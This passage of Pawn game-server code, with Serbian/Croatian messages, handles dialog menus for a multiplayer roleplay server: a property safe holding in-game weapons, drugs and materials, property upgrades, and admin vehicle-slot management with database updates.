					format( globalstring, sizeof( globalstring ), "{FFFFFF}Oruzje 1: %s | Metaka: (%s)\n", wepname1, fNumber(II[hid][iMunicija][0]));
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "Oruzje 2: %s | Metaka: (%d)\n", wepname2, fNumber(II[hid][iMunicija][1]));
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "Oruzje 3: %s | Metaka: (%d)\n", wepname3, fNumber(II[hid][iMunicija][2]));
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "Oruzje 4: %s | Metaka: (%d)", wepname4, fNumber(II[hid][iMunicija][3]));
					strcat( DialogStrgEx, globalstring );

					ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
				case 1: ShowPlayerDialog( playerid, dialog_SAFEPUTDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za ubacivanje.", "Potvrdi", "Odustani" );
				case 2: ShowPlayerDialog( playerid, dialog_SAFETAKEDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za uzimanje.", "Potvrdi", "Odustani" );
				case 3:
				{
				    if( GetFactionType( playerid ) == ORG_TIP_VLADINA || GetFactionType( playerid ) == ORG_TIP_HITMAN )
					{
				        SendErrorMessage( playerid, "PD/SD/HITMAN nema razloga ubacivati oruzja u sef.");
						return 1;
					}
					if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u waru." );
                    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
					new wepname[32], hid = inProperty[ playerid ];

				    if( ForbiddenWeap( playerid ) ) return SendErrorMessage( playerid, "Ne mozes ubaciti zabranjena oruzja u sef." );
					if( II[ hid ][ iOruzje ][ 0 ] != 0 && II[ hid ][ iOruzje ][ 1 ] != 0 && II[ hid ][ iOruzje ][ 2 ] != 0 && II[ hid ][ iOruzje ][ 3 ] != 0 ) return SendErrorMessage( playerid, "Slotovi za oruzja su zauzeti!");
					if( II[ hid ][ iOruzje ][ 0 ] == 0)
					{
						if( ( II[ hid ][ iMunicija ][ 0 ] + GetPlayerAmmo( playerid ) ) < 501 )
						{
	                        format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
				            II[ hid ][ iMunicija ][ 0 ] = GetPlayerAmmo( playerid );
				            II[ hid ][ iOruzje ][ 0 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveProperty( hid );

							SendNearbyMessage(playerid, 6.0, 0xC2A2DAFF, "* %s sprema %s u sef.", ImeIgraca( playerid ), wepname);
						}
						else SendErrorMessage( playerid, "U 1 slotu mozete staviti najvise 500 metaka!");
					}
					else if( II[ hid ][ iOruzje ][ 1 ] == 0)
					{
						if( ( II[ hid ][ iMunicija ][ 1 ] + GetPlayerAmmo( playerid ) ) < 501 )
						{
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
				            II[ hid ][ iMunicija ][ 1 ] = GetPlayerAmmo( playerid );
				            II[ hid ][ iOruzje ][ 1 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveProperty( hid );

							SendNearbyMessage(playerid, 6.0, 0xC2A2DAFF, "* %s sprema %s u sef.", ImeIgraca( playerid ), wepname);
						}
						else SendErrorMessage( playerid, "U 2 slotu mozete staviti najvise 500 metaka!");
					}
					else if( II[ hid ][ iOruzje ][ 2 ] == 0)
					{
						if( ( II[ hid ][ iMunicija ][ 2 ] + GetPlayerAmmo( playerid ) ) < 501 )
						{
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
				            II[ hid ][ iMunicija ][ 2 ] = GetPlayerAmmo( playerid );
				            II[ hid ][ iOruzje ][ 2 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveProperty( hid );

							SendNearbyMessage(playerid, 6.0, 0xC2A2DAFF, "* %s sprema %s u sef.", ImeIgraca( playerid ), wepname);
						}
						else SendErrorMessage( playerid, "U 3 slotu mozete staviti najvise 500 metaka!");
					}
					else if( II[ hid ][ iOruzje ][ 3 ] == 0)
					{
						if( ( II[ hid ][ iMunicija ][ 3 ] + GetPlayerAmmo( playerid ) ) < 501 )
						{
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
				            II[ hid ][ iMunicija ][ 3 ] = GetPlayerAmmo( playerid );
				            II[ hid ][ iOruzje ][ 3 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveProperty( hid );

							SendNearbyMessage(playerid, 6.0, 0xC2A2DAFF, "* %s sprema %s u sef.", ImeIgraca( playerid ), wepname);
						}
						else SendErrorMessage( playerid, "U 4 slotu mozete staviti najvise 500 metaka!");
					}
				}
				case 4:
				{
				    new hid = inProperty[ playerid ], wepname1[32], wepname2[32], wepname3[32], wepname4[32];
				    if( II[ hid ][ iOruzje ][ 0 ] == 0 && II[ hid ][ iOruzje ][ 1 ] == 0 && II[ hid ][ iOruzje ][ 2 ] == 0 && II[ hid ][ iOruzje ][ 3 ] == 0 ) return SendErrorMessage( playerid, "Svi slotovi su prazni!");
					if( II[ hid ][ iOruzje ][ 0 ] != 0) format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 0 ] ] );
					else format(wepname1, sizeof(wepname1), "None");

					if( II[ hid ][ iOruzje ][ 1 ] != 0) format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 1 ] ] );
					else format(wepname2, sizeof(wepname2), "None");

				    if( II[ hid ][ iOruzje ][ 2 ] != 0) format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 2 ] ] );
					else format(wepname3, sizeof(wepname3), "None");

	                if( II[ hid ][ iOruzje ][ 3 ] != 0) format( wepname4, sizeof( wepname4 ), "%s", WeapNames[ II[ hid ][ iOruzje ][ 3 ] ] );
					else format(wepname4, sizeof(wepname4), "None");
				    PropertySafeGun[ playerid ] = hid;
				    format( globalstring, sizeof( globalstring ), "%s\n%s\n%s\n%s", wepname1, wepname2, wepname3, wepname4 );
					ShowPlayerDialog( playerid, dialog_PROPERTYWEPTAKE, DIALOG_STYLE_LIST, D_NASLOV, globalstring, "Potvrdi", "Odustani" );
				}
				case 5: ShowPlayerDialog( playerid, dialog_SAFEPUTMATS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu materijala za ostavljanje:", "Potvrdi", "Odustani" );
				case 6: ShowPlayerDialog( playerid, dialog_SAFETAKEMATS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu materijala za uzimanje:", "Potvrdi", "Odustani" );
			}
	    }
	}
	else if(dialogid == dialog_SAFEPUTMATS )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new kolicina, izbor = inProperty[ playerid ];
		    if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_SAFETAKEMATS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu materijala za uzimanje.", "Potvrdi", "Odustani" );

		    if( PlayerInfo[ playerid ][ xMaterijali ] == 0 ) return SendErrorMessage( playerid, "Nemate materijale kod vas!" );
		    if( kolicina < 1 || kolicina > PlayerInfo[ playerid ][ xMaterijali ] ) return SendErrorMessage( playerid, "Nemate toliko materijala kod vas!");

			if( (II[ izbor ][ iMats ]+kolicina) > 10000 ) return SendErrorMessage( playerid, "Najvise u sefu moze stati 10000 materijala." );

            PlayerInfo[ playerid ][ xMaterijali ] -= kolicina;
            sql_user_update_integer( playerid, "materials", PlayerInfo[ playerid ][ xMaterijali ] );

		    SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s stavlja materijale u sef.", ImeIgraca( playerid ) );
		    SCMF( playerid, 0xFFFF00FF, "(IMOVINA): Stavili ste {FFFFFF}(%d) {FFFF00}materijala u sef.", kolicina );

		    II[ izbor ][ iMats ] += kolicina;

			SaveProperty( izbor );
		}
	}
	else if(dialogid == dialog_SAFETAKEMATS )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new kolicina, izbor = inProperty[ playerid ];
		    if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_SAFETAKEMATS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu materijala za uzimanje.", "Potvrdi", "Odustani" );

		    if( II[ izbor ][ iMats ] == 0 ) return SendErrorMessage( playerid, "Nema materijala u sefu!" );
		    if( kolicina < 1 || kolicina > II[ izbor ][ iMats ] ) return SendErrorMessage( playerid, "Nemate toliko materijala u sefu!");

            PlayerInfo[ playerid ][ xMaterijali ] += kolicina;
            sql_user_update_integer( playerid, "materials", PlayerInfo[ playerid ][ xMaterijali ] );

		    SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s uzima materijale iz sef.", ImeIgraca( playerid ) );
		    SCMF( playerid, 0xFFFF00FF, "(IMOVINA): Uzeli ste {FFFFFF}(%d) {FFFF00}materijala iz sef.", kolicina );

		    II[ izbor ][ iMats ] -= kolicina;

			SaveProperty( izbor );
		}
	}
	else if(dialogid == dialog_SAFEPUTDRUG )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        new kolicina, hid = inProperty[ playerid ];
			if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_SAFEPUTDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za ostavljanje.", "Potvrdi", "Odustani" );
	       	if( kolicina < 1 || kolicina > 5000 ) return SendErrorMessage( playerid, "Ne mozete ispod 1 i preko 5000.");
	       	if( PlayerInfo[playerid][xTorba_Droga] < kolicina ) return SendErrorMessage( playerid, "Nemate toliko droge u torbi.");

			if( (II[ hid ][ iDrugAmmount ]+kolicina) < 1000000 )
			{
				II[ hid ][ iDrugAmmount ] += kolicina;
				PlayerInfo[playerid][xTorba_Droga] -= kolicina;
				sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

			    SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s ostavlja drogu u sef.", ImeIgraca( playerid ) );
				SCMF( playerid, 0xFFFF00FF, "(IMOVINA): Ostavili ste {FFFFFF}(%dg) {FFFF00}droge u sef.", kolicina );

				SaveProperty( hid );
			}
			else SendErrorMessage( playerid, "Nemate mesta da stavite vise droge u imovinu." );
	    }
	}
	else if(dialogid == dialog_SAFETAKEDRUG )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        new kolicina, hid = inProperty[ playerid ];
			if( sscanf( inputtext, "d", kolicina ) ) return ShowPlayerDialog( playerid, dialog_SAFETAKEDRUG, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite kolicinu droge za uzimanje.", "Potvrdi", "Odustani" );
			if( II[ hid ][ iDrugAmmount ] == 0 ) return SendErrorMessage( playerid, "Ova imovina nema drogu!");
	       	if( kolicina < 1 || kolicina > II[ hid ][ iDrugAmmount ] ) return SendErrorMessage( playerid, "Ova imovina nema toliko droge!");

			II[ hid ][ iDrugAmmount ] -= kolicina;
			PlayerInfo[playerid][xTorba_Droga] += kolicina;
			sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);

			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s uzima drogu iz sefa.", ImeIgraca( playerid ) );
			SCMF( playerid, 0xFFFF00FF, "(IMOVINA): Uzeli ste {FFFFFF}(%dg) {FFFF00}droge iz sefa.", kolicina );

			SaveProperty( hid );
	    }
	}
	else if(dialogid == dialog_PROPUNAPREDI )
	{
	    if( !response ) return 1;
	    if( response )
		{
			new 
				broj, 
				id = ChosenProperty[ playerid ];

			if( sscanf( inputtext, "d", broj ) ) return ShowPlayerDialog( playerid, dialog_PROPUNAPREDI, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Izaberite broj: 1. alarm, 2. brava, 3. vrata.\nCene: alarm(500$), brava(300$), vrata(100$)", "Potvrdi", "Odustani" );
			if( broj == 1 )
			{
			    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
				if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(500$)!");
				if( strcmp( ImeIgraca( playerid ), II[ inProperty[ playerid ] ][ iOwner ], true) == 0 )
		    	{
		    	    if( II[ inProperty[ playerid ] ][ iAlarm ] == 4 ) return SendErrorMessage( playerid, "Vec imate najveci moguci level alarma!");
		    	    II[ inProperty[ playerid ] ][ iAlarm ] ++;
					DajIgracuNovac( playerid, -500 );
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					SCMF( playerid, 0xFFFF00FF, "(IMOVINA): Unapredili ste vas alarm level {FFFFFF}(%d/4).", II[ inProperty[ playerid ] ][ iAlarm ]);
					SaveProperty( inProperty[ playerid ] );
		    	}
				else SendErrorMessage( playerid, "Ovo nije vase." );
			}
			else if( broj == 2 )
			{
			    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
				if( PlayerInfo[ playerid  ][ xNovac ] < 100 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(100$)!");
				if( strcmp( ImeIgraca( playerid ), II[ inProperty[ playerid ] ][ iOwner ], true) == 0 )
		    	{
		    	    if( II[ inProperty[ playerid ] ][ iLockLevel ] == 4 ) return SendErrorMessage( playerid, "Vec imate najveci moguci level brave!");
		    	    II[ inProperty[ playerid ] ][ iLockLevel ] ++;
					DajIgracuNovac( playerid, -100 );
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					SCMF( playerid, 0xFFFF00FF, "(IMOVINA): Unapredili ste vasu bravu {FFFFFF}(%d/4).", II[ inProperty[ playerid ] ][ iLockLevel ]);
					SaveProperty( inProperty[ playerid ] );
		    	}
				else SendErrorMessage( playerid, "Ovo nije vase." );
			}
			else if( broj == 3 )
			{
			    if( inProperty[ playerid ] != id ) return SendErrorMessage( playerid, "Niste u vasoj kuci/stanu/vikendici." );
				if( PlayerInfo[ playerid ][ xNovac ] < 300 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(300$)!");
				if( strcmp( ImeIgraca( playerid ), II[ inProperty[ playerid ] ][ iOwner ], true) == 0 )
		    	{
		    	    if( II[ inProperty[ playerid ] ][ iDoorLevel ] == 5 ) return SendErrorMessage( playerid, "Vec imate najveci moguci level vrata!");
		    	    II[ inProperty[ playerid ] ][ iDoorLevel ] ++;
					DajIgracuNovac( playerid, -300 );
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
					SCMF( playerid, 0xFFFF00FF, "(IMOVINA): Unapredili ste vasa vrata {FFFFFF}(%d/5).", II[ inProperty[ playerid ] ][ iDoorLevel ]);
					SaveProperty( inProperty[ playerid ] );
		    	}
				else SendErrorMessage( playerid, "Ovo nije vase." );
			}
			else SendErrorMessage( playerid, "Pogresan broj." );
	    }
	}
	else if(dialogid == dialog_VEHLIST_START )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new ID = ChosenPlayerVeh[ playerid ];

		    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    strcat( DialogStrgEx, "{FFFFFF}Slot\t{FFFFFF}Ime vozila\t{FFFFFF}ID vozila" );

		    for( new j = 0; j < MAX_VEH_SLOT; j ++ )
			{
				if( (j+1) <= PlayerInfo[ ID ][ xSlotoviVozila ] && player_veh[ ID ][ vehicle_id ][ j ] != -1 )
				{
					format( globalstring, sizeof( globalstring ), "\n%d\t%s\t%d", j+1, getVehicleName( player_veh[ ID ][ vehicle_id ][ j ] ), player_veh[ ID ][ vehicle_id ][ j ] );
				}
				else format( globalstring, sizeof( globalstring ), "\n%d\tPRAZAN\t-1", j+1 );
				strcat( DialogStrgEx, globalstring );
			}

		    format( globalstring, sizeof( globalstring ), "%s - VOZILA", ImeIgraca( ID ) );

			ShowPlayerDialog( playerid, dialog_VEHLIST_ADMIN, DIALOG_STYLE_TABLIST_HEADERS, globalstring, DialogStrgEx, "Odaberi", "Izlaz" );

		    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		}
	}
	else if(dialogid == dialog_VEHLIST_ADMIN )
	{
	    if( !response ) return 1;
		if( response )
		{
		    ChosenVehicle[ playerid ] = listitem;

			format( globalstring, 20, "Slot - %d", (listitem+1) );
      		ShowPlayerDialog( playerid, dialog_VEHCHOSEN_ADMIN, DIALOG_STYLE_LIST, globalstring,
																							  	"{4282C0}(1). {FFFFFF}Informacije\n\
																								 {4282C0}(2). {FFFFFF}Stvari u gepeku\n\
																								 {4282C0}(3). {FFFFFF}Ocisti slot\n\
																								 {4282C0}(4). {FFFFFF}Postavi vozilo", "Odaberi", "Izadji" );
		}
	}
	else if(dialogid == dialog_VEHCHOSEN_ADMIN )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new player_id = ChosenPlayerVeh[ playerid ],
				slot_id = ChosenVehicle[ playerid ];

			switch( listitem )
			{
			    case 0:
				{
			        if( player_veh[ player_id ][ vehicle_id ][ slot_id ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozila u ovom slotu.");

                    new izbor = player_veh[ player_id ][ vehicle_id ][ slot_id ];

                    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
					format( globalstring, sizeof( globalstring ), "{4282C0}- Vozilo: {FFFFFF}%s {4282C0}| Model ID: {FFFFFF}(%d)\n\n", ImeVozila[ VehicleInfo[ izbor ][ vModel ]-400 ],  VehicleInfo[ izbor ][ vModel ] );
					strcat( DialogStrgEx, globalstring);

					format( globalstring, sizeof( globalstring ), "{4282C0}- InGame ID: {FFFFFF}(%d) {CCCCCC}[PROMENLJIVI]\n", izbor );
					strcat( DialogStrgEx, globalstring);

					format( globalstring, sizeof( globalstring ), "{4282C0}- SQL ID: {FFFFFF}(%d) {CCCCCC}[STALNI]\n", VehicleInfo[ izbor ][ vSqlID ] );
					strcat( DialogStrgEx, globalstring);

					if( VehicleInfo[ izbor ][ vReg ] == 1 )
					{
					    new tablice[ 10 ];
						format( tablice, sizeof( tablice ), "BG-%04d", izbor );

					    format( globalstring, sizeof( globalstring ), "{4282C0}- Registracija: {FFFFFF}%s\n",  tablice );
						strcat( DialogStrgEx, globalstring);
						if(VehicleInfo[izbor][vRegVreme] > 0) format( globalstring, sizeof( globalstring ), "{4282C0}- Registrovan jos: {FFFFFF}(%dh)\n",  VehicleInfo[ izbor ][ vRegVreme ] );
						else format( globalstring, sizeof( globalstring ), "{4282C0}- Ostalo do brisanja vozila: {FFFFFF}(%dh) {FF0000}[REGISTRUJTE VOZILO!]\n", VehicleInfo[ izbor ][ vRegVreme ]+100 );
						strcat( DialogStrgEx, globalstring);
					}
					else if( VehicleInfo[ izbor ][ vReg ] == 2 )
					{
					    format( globalstring, sizeof( globalstring ), "{4282C0}- Registracija: {FFFFFF}%s\n",  VehicleInfo[ izbor ][ vTablice ] );
						strcat( DialogStrgEx, globalstring);
						if(VehicleInfo[izbor][vRegVreme] > 0) format( globalstring, sizeof( globalstring ), "{4282C0}- Registrovan jos: {FFFFFF}(%dh)\n",  VehicleInfo[ izbor ][ vRegVreme ] );
						else format( globalstring, sizeof( globalstring ), "{4282C0}- Ostalo do brisanja vozila: {FFFFFF}(%dh) {FF0000}[REGISTRUJTE VOZILO!]\n", VehicleInfo[ izbor ][ vRegVreme ]+100 );
						strcat( DialogStrgEx, globalstring);
					}
					else
					{
					    format( globalstring, sizeof( globalstring ), "{4282C0}- Ostalo do brisanja vozila: {FFFFFF}(%dh) {FF0000}[REGISTRUJTE VOZILO!]\n", VehicleInfo[ izbor ][ vRegVreme ]+100 );
						strcat( DialogStrgEx, globalstring);
					}

					if( VehicleInfo[ izbor ][ vLocked ] == 1) strcat( DialogStrgEx, "{4282C0}- Status brave: {FFFFFF}'Zakljucano'\n");
					else strcat( DialogStrgEx, "{4282C0}- Status brave: {FFFFFF}'Otkljucano'\n");
                    format( globalstring, sizeof( globalstring ), "{4282C0}- Predjena kilometraza: {FFFFFF}(%d)\n", VehicleInfo[ izbor ][ vKilometri ] );
					strcat( DialogStrgEx, globalstring);

					if( VehicleInfo[ izbor ][ vLock ] == 0) strcat( DialogStrgEx, "{4282C0}- Kvaliteta brave: {FFFFFF}'Nekvalitetna'\n");
					else
					{
						format( globalstring, sizeof( globalstring ), "{4282C0}- Kvaliteta brave: {FFFFFF}(%d)\n",  VehicleInfo[ izbor ][ vLock ] );
						strcat( DialogStrgEx, globalstring);
					}
			        if( VehicleInfo[ izbor ][ vImobilizator ] == 0) strcat( DialogStrgEx, "{4282C0}- Imobilizator: {FFFFFF}'Nekvalitetan'\n");
					else
					{
					    format( globalstring, sizeof( globalstring ), "{4282C0}- Imobilizator level: {FFFFFF}'%d'\n",  VehicleInfo[ izbor ][ vImobilizator ] );
						strcat( DialogStrgEx, globalstring);
					}

					if( VehicleInfo[ izbor ][ vAlarm ] > 0)
					{
						format( globalstring, sizeof( globalstring ), "{4282C0}- Alarm level: {FFFFFF}(%d)\n",  VehicleInfo[ izbor ][ vAlarm] );
						strcat( DialogStrgEx, globalstring);
					}
					else strcat( DialogStrgEx, "{4282C0}- Alarm: {FFFFFF}'Nema'\n");

					ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
				case 1:
				{
				    if( player_veh[ player_id ][ vehicle_id ][ slot_id ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozila u ovom slotu.");

                    new autoid = player_veh[ player_id ][ vehicle_id ][ slot_id ],
						wepname1[32],
						wepname2[32],
						wepname3[32];

	                if( VehicleInfo[ autoid ][ vWeap1 ] != 0 ) format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap1 ] ] );
					else strmid(wepname1, "None", 0, 5);

					if( VehicleInfo[ autoid ][ vWeap2 ] != 0) format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap2 ] ] );
					else strmid(wepname2, "None", 0, 5);

				    if( VehicleInfo[ autoid ][ vMelee ] != 0) format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vMelee ] ] );
					else strmid(wepname3, "None", 0, 5);

	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	                format( globalstring, sizeof( globalstring ), "{4282C0}- Materijali: {FFFFFF}(%d)\n", VehicleInfo[ autoid ][ vMaterijali ] );
	               	strcat( DialogStrgEx, globalstring );

	                format( globalstring, sizeof( globalstring ), "{4282C0}- Droga: {FFFFFF}(%dg)\n", VehicleInfo[ autoid ][ vDrugAmmount ] );
	               	strcat( DialogStrgEx, globalstring );

	               	format( globalstring, sizeof( globalstring ), "{4282C0}- Melee: {FFFFFF}%s\n", wepname3 );
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "{4282C0}- Oruzja 1: {FFFFFF}%s {4282C0}| Metaka: {FFFFFF}(%d)\n", wepname1, VehicleInfo[ autoid ][ vAmmo1 ] );
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "{4282C0}- Oruzja 2: {FFFFFF}%s {4282C0}| Metaka: {FFFFFF}(%d)\n", wepname2, VehicleInfo[ autoid ][ vAmmo2 ] );
					strcat( DialogStrgEx, globalstring );

	               	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
			    case 2:
				{
			        if( player_veh[ player_id ][ vehicle_id ][ slot_id ] == -1 ) return SendErrorMessage( playerid, "Igrac nema vozila u ovom slotu.");

					if( player_veh[ player_id ][ vehicle_id ][ slot_id ] != -1 && IsValidVehicle( player_veh[ player_id ][ vehicle_id ][ slot_id ] ) )
					{
                        new c = player_veh[ player_id ][ vehicle_id ][ slot_id ];

						if( VehicleInfo[ c ][ v_owner_id ] == player_id )
						{
							sql_vehicles_delete( c );
							ResetVehicle( c );
							SMG_DestroyVehicle( c );
						}
					}

					player_veh[ player_id ][ vehicle_id ][ slot_id ] = -1;

					SendInfoMessage( player_id, "Administrator {FFFFFF}%s {4282C0}vam je ocistio slot vozila {FFFFFF}(%d).", ImeIgraca( playerid ), slot_id+1 );
					SendInfoMessage( playerid, "Ocistili ste {FFFFFF}'%s-u' {4282C0}slot vozila {FFFFFF}(%d).", ImeIgraca( player_id ), slot_id+1 );
			    }
			    case 3:
				{
			        if( player_veh[ player_id ][ vehicle_id ][ slot_id ] != -1 ) return SendErrorMessage( playerid, "Igrac vec ima vozilo, prvo mu moras ocistiti slot.");

			        ShowPlayerDialog( playerid, dialog_VEHSLOTSET_ADMIN, DIALOG_STYLE_INPUT, "{FFFFFF}Unesi ID vozila:", "{FFFFFF}* Unesite ID vozila koji zelite da postaviti igracu kao osobno vozilo.", "Odaberi", "Izadji" );
			    }
			}
		}
	}
	else if(dialogid == dialog_VEHSLOTSET_ADMIN )
	{
	    if( !response ) return 1;
		if( response )
		{
		    new player_id = ChosenPlayerVeh[ playerid ],
				slot_id = ChosenVehicle[ playerid ],
				veh_id;

		    if( sscanf( inputtext, "d", veh_id ) ) return ShowPlayerDialog( playerid, dialog_VEHSLOTSET_ADMIN, DIALOG_STYLE_INPUT, "{FFFFFF}Unesi ID vozila:", "{FFFFFF}* Unesite ID vozila koji zelite da postaviti igracu kao osobno vozilo.", "Odaberi", "Izadji" );
			if( veh_id == IVI ) return ShowPlayerDialog( playerid, dialog_VEHSLOTSET_ADMIN, DIALOG_STYLE_INPUT, "{FFFFFF}Unesi ID vozila:", "{FFFFFF}* Pogresan ID vozila.\nUnesite ID vozila koji zelite da postaviti igracu kao osobno vozilo.", "Odaberi", "Izadji" );
			if( VehicleInfo[ veh_id ][ vUsage ] != PRIVATNO_VOZILO ) return ShowPlayerDialog( playerid, dialog_VEHSLOTSET_ADMIN, DIALOG_STYLE_INPUT, "{FFFFFF}Unesi ID vozila:", "{FFFFFF}* Samo privatna vozila.\nUnesite ID vozila koji zelite da postaviti igracu kao osobno vozilo.", "Odaberi", "Izadji" );
			if( VehicleInfo[ veh_id ][ v_owner_id ] != -1 ) return ShowPlayerDialog( playerid, dialog_VEHSLOTSET_ADMIN, DIALOG_STYLE_INPUT, "{FFFFFF}Unesi ID vozila:", "{FFFFFF}* Ovo vozilo vec ima vlasnika.\nUnesite ID vozila koji zelite da postaviti igracu kao osobno vozilo.", "Odaberi", "Izadji" );

			player_veh[ player_id ][ vehicle_id ][ slot_id ] = veh_id;

			VehicleInfo[ veh_id ][ v_owner_id ] = player_id;
			VehicleInfo[ veh_id ][ vOwner_sqlID ] = PlayerInfo[ player_id ][ xID ];
			strmid( VehicleInfo[ veh_id ][ vOwner ], ImeIgraca( player_id ), 0, strlen( ImeIgraca( player_id ) ), 32 );

			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `owner_sqlID` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
									VehicleInfo[ veh_id ][ vOwner_sqlID ],
									VehicleInfo[ veh_id ][ vSqlID ] );

			mysql_tquery( mSQL, q );

			SendInfoMessage( player_id, "Administrator {FFFFFF}%s {4282C0}vam je postavio vozilo {FFFFFF}(%d) {4282C0}na slot {FFFFFF}(%d).", ImeIgraca( playerid ), veh_id, slot_id+1 );
			SendInfoMessage( playerid, "Postavili ste {FFFFFF}'%s-u' {4282C0}vozilo {FFFFFF}(%d) {4282C0}na slot {FFFFFF}(%d).", ImeIgraca( player_id ), veh_id, slot_id+1 );
		}
	}
	else if(dialogid == dialog_VEHLIST )
	{
	    if( !response ) return 1;
		if( response )
		{
		    if( player_veh[ playerid ][ vehicle_id ][ listitem ] == -1 ) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");
			if( player_veh[ playerid ][ vehicle_id ][ listitem ] == 0 ) return SendErrorMessage( playerid, "Ti ne posedujes vozilo u ovom slotu.");

			if( VehicleInfo[ player_veh[ playerid ][ vehicle_id ][ listitem ] ][ vSqlID ] != 0 )
			{
				if( strcmp( ImeIgraca( playerid ), VehicleInfo[ player_veh[ playerid ][ vehicle_id ][ listitem ] ][ vOwner ], true ) == 0 )
				{
					ChosenVehicle[ playerid ] = player_veh[ playerid ][ vehicle_id ][ listitem ];
	          		ShowPlayerDialog( playerid, dialog_VEHCHOSEN, DIALOG_STYLE_LIST, "{FFFFFF}Vozilo:",
																									  	"{4282C0}(1). {FFFFFF}Informacije\n\
																										  {4282C0}(2). {FFFFFF}Parkiraj\n\
																										  {4282C0}(3). {FFFFFF}Lociraj\n\
																										  {4282C0}(4). {FFFFFF}Prodaj igracu\n\
																										  {4282C0}(5). {FFFFFF}Prodaj drzavi\n\
																										  {4282C0}(6). {FFFFFF}Makni tuning\n\
																										  {4282C0}(7). {FFFFFF}Neon\n\
																										  {4282C0}(8). {FFFFFF}Gepek\n\
																										  {4282C0}(9). {FFFFFF}Promeni boju\n\
																										  {4282C0}(10). {FFFFFF}Registruj\n\
